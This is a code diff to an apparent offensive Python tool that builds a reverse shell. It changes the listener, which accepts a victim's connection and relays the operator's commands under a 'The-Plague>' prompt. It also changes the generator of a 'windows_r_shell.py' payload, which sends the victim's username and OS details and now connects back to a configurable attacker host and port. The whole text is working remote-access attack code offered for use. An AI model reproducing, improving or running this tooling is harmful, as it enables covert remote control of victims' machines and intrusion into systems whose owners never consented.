@@ -50,46 +50,63 @@ try:
                 
             
                 def socket_server():
+                    try:
+                        ip = f"{LHOST}"
+                        port = int(LPORT)
+                        clear_scr()
+                        print(banner)
+                        print("")
+                        print(f"    Listening on port {LPORT} and ip add {LHOST}")
+                        print("")
+                        connection = socket(AF_INET, SOCK_STREAM)
+                        connection.bind((ip, port))
+                        
+                        connection.listen(5)
+                        client, addr = connection.accept()
+                        
+                        print("connect -> "+str(addr))
+                        print("")
+                        print("type exit to quit")
+                        print("")
+                        print("type cls to clear screen")
+                        print("")
+                    except KeyboardInterrupt:
+                        print("Are youto lazy to type exit!?")
+                        exit()
 
-                    ip = f"{LHOST}"
-                    port = int(LPORT)
-                    clear_scr()
-                    print(banner)
-                    print("Listening...")
-                    connection = socket(AF_INET, SOCK_STREAM)
-                    connection.bind((ip, port))
+
                     
-                    connection.listen(5)
-                    client, addr = connection.accept()
-                    
-                    print("connect -> "+str(addr))
-                    print("")
-                    print("type exit to quit")
-                    print("")
+
                     def main_func():
-                        while True:
-                            recever = client.recv(2000).decode()
-                            print(recever)
-                            cmd = input("The-Plague>")                         
-                            if cmd == "exit" :
-                                client.send(cmd.encode())
-                                exit()
-                            elif cmd == "" or cmd == None:
-                                try:
-                                    cmd = ("?")
-                                except:
-                                    pass
-                                client.send(cmd.encode())
-                            elif cmd == "cls":
-                                try:
-                                    clear_scr()
-                                    print(banner)
-                                    
-                                except:
-                                    pass
-                                client.send(cmd.encode())                                    
-                            else:
-                                client.send(cmd.encode())
+                        try:
+                            while True:
+                                recever = client.recv(2000).decode()
+                                print(recever)
+                                cmd = input("The-Plague>")                         
+                                if cmd == "exit" :
+                                    client.send(cmd.encode())
+                                    exit()
+                                elif cmd == "" or cmd == None:
+                                    try:
+                                        cmd = ("?")
+                                    except:
+                                        pass
+                                    client.send(cmd.encode())
+                                elif cmd == "cls":
+                                    try:
+                                        clear_scr()
+                                        print(banner)
+                                        
+                                    except:
+                                        pass
+                                    client.send(cmd.encode())                                    
+                                else:
+                                    client.send(cmd.encode())
+                        except KeyboardInterrupt:
+                            print("")
+                            print("Are you to lazy to type exit!?")
+                            exit()
+
                     main_func()
                 f = open("windows_r_shell.py", "w")
                 f.write(f'''from getpass import getuser
@@ -103,9 +120,9 @@ get_os = platform.uname()
 get_user = getuser()
 os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)
 
-ip = "192.168.1.14"
+ip = "{LHOST}"
 
-port = 87
+port = {LPORT}
 connection = socket(AF_INET, SOCK_STREAM)
 def final_func():
     def conn_func():
